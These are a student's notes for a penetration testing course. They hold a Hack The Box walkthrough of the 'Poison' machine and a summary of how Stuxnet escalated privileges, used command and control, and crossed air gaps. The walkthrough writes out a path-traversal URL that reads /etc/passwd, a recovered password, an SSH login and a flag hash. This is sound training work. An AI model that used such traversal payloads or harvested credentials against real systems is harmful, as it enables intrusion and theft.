# h4

## 1
*Hack Poison*

Navigated to 10.10.10.84

Submitted listfiles.php

Found pwdbackup.txt within listfiles.txt

Submitted pwdbackup.txt

Inside was some base64 encrypted data + message saying it was encrypted at least 13 times

Decrypted the data 13 times
Got password: Charix!2#4%6&8(0

Used ZAP to quick attack 10.10.10.84
->Alerts 
-> Path traversal 
-> http://10.10.10.84/browse.php?file=%2Fetc%2Fpasswd
-> Username: charix

	ssh charix@10.10.10.84 
password: Charix!2#4%6&8(0

	less user.txt         
eaacdfb2d141b72a589233063604209c

	netstat
	scp charix@10.10.10.84:secret.zip .
unzip

	xxd secret


## 2
-
## 3

*Read an analysis of Stuxnet*


1) *How Stuxnet broke into computers?*

Stuxnet only breaks into a computer running 32 bit version of one of the following OS:
    
- Win2K
- WinXP
- Windows 2003
- Vista
- Windows Server 2008
- Windows 7
- Windows Server 2008 R2

If Stuxnet doesn’t have admin rights it tries to get them by executing one of the two exploits it has based on the target computers operating system. Against Windows Vista, Windows 7, or Windows Server 2008 R2 it tries to exploit “the currently undisclosed Task Scheduler Escalation of Privilege vulnerability”. Against Windows XP and Windows 2000, the
Windows Win32k.sys Local Privilege Escalation vulnerability (MS10-073) is exploited. In both cases a file called “main .dll” is injected to run as a new process, either as a new task (with admin rights) in the case of Task Scheduler vulnerability or, in the case of Win32k.sys vulnerability,  within csrss.exe. 


2) *How command and control worked?*

After infecting a machine Stuxnet gathers information on the compromised machine and sends that information to a command and control server on port 80 via http. The attackers are informed if the machine is running either Siemens Step7 or WinCC which are the Stuxnets targeted pieces of software.

A command and control server then sends back an encrypted response payload to the client. Part of the payload is a Windows executable which is then executed. This gives Stuxnet a backdoor functionality which allows it to upload and run code on the infected machine. 


3) *How Stuxnet crossed the air gap?*

At first, Stuxnet had to be physically installed on a victim machine, likely a laptop or a infected USB stick was used. It was later modified so that it could self-replicate, spread within local network and inject itself onto services.exe to infect removable drives.

Stuxnet was able to cross the air gap when contractors, employed by different clients, would connect their mobile devices and USB sticks to infected local networks at one location and spread the infection by connecting their now infected devices into a local network at another location.   

***
Course page: http://terokarvinen.com/2018/penetration-testing-course-autumn-2018

https://www.langner.com/wp-content/uploads/2017/03/to-kill-a-centrifuge.pdf

https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf



- Lenovo Ideapad 720s
- Kali Xfce 64 live usb
- Intel Core i7-8550U
- GeForce MX150
- 8 GB RAM
- 500 GB SSD


